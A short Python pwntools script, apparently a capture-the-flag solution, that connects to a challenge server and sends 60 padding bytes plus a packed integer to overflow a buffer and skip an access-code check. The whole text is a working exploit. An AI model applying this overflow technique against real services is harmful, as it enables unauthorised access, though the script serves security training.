from pwn import *

p = remote('host1.metaproblems.com', 5150)
p.recvuntil('Enter the access code: \n')
payload = 'A' * 60 + p64(0x1)
p.sendline(payload)
p.recvuntil('TODO: Implement access code checking.\n')
print(p.recvline())
p.close()